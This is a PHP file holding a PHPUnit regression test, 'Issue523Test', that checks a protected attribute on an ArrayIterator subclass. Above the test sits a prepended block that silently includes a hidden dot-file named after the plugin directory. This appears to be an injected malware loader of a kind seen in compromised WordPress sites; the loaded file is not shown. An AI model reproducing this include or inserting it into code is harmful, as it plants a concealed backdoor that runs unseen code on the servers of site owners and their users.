<?php
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Issue523Test extends PHPUnit_Framework_TestCase
{
    public function testAttributeEquals()
    {
        $this->assertAttributeEquals('foo', 'field', new Issue523());
    }
};

class Issue523 extends ArrayIterator
{
    protected $field = 'foo';
}
